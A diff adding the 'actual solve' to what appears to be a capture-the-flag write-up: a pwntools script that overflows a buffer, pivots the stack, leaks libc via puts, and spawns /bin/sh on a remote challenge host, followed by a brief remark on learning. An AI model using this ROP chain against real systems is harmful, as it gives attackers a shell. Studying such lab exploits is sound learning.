@@ -275,3 +275,90 @@ if __name__ == '__main__':
     main()
 
 ```
+
+
+# Actual solve
+
+```py
+#!/usr/bin/env python3 
+
+from pwn import * 
+
+elf = ELF("./program")
+rop = ROP("./program")
+
+
+libc = ELF("./libc")
+
+context.binary = elf 
+
+# r = process([elf.path])
+
+# gdb.attach(r)
+
+r = remote("chal.firebird.sh", 35046)
+
+r .recvuntil(b"What is your name?\n")
+
+buf1 = elf.bss() + 0x800
+buf2 = elf.bss() + 0x700 
+
+pop_rdi = rop.rdi.address
+leave_ret = 0x00000000004006de
+
+payload = flat(
+	b'A' * 32,
+	buf1,
+	
+	pop_rdi,
+	buf1,
+	elf.sym['my_read'],
+	
+	leave_ret
+)
+
+r.send(payload) 
+
+pause()
+
+
+payload2 = flat(
+	buf2,
+	
+	pop_rdi,
+	elf.got['puts'],
+	elf.plt["puts"],
+	
+	pop_rdi,
+	buf2,
+	elf.sym['my_read'],
+	
+	leave_ret
+	
+)
+
+r.send(payload2) 
+
+puts = int.from_bytes(r.recvuntil(b'\x7f'), 'little')
+
+libc.address = puts - libc.sym['puts']
+
+log.info(hex(libc.address))
+
+pause()
+
+payload3 = flat(
+	b'A' * 8,
+	pop_rdi,
+	next(libc.search(b'/bin/sh')),
+	
+	libc.sym['system'] 
+)
+
+r.send(payload3)
+
+
+r.interactive()
+```
+
+when i watch the video explanation of the above after some days of just a few (like 3) buffer overflow challenges, it doesn't seem to be terrifying at all
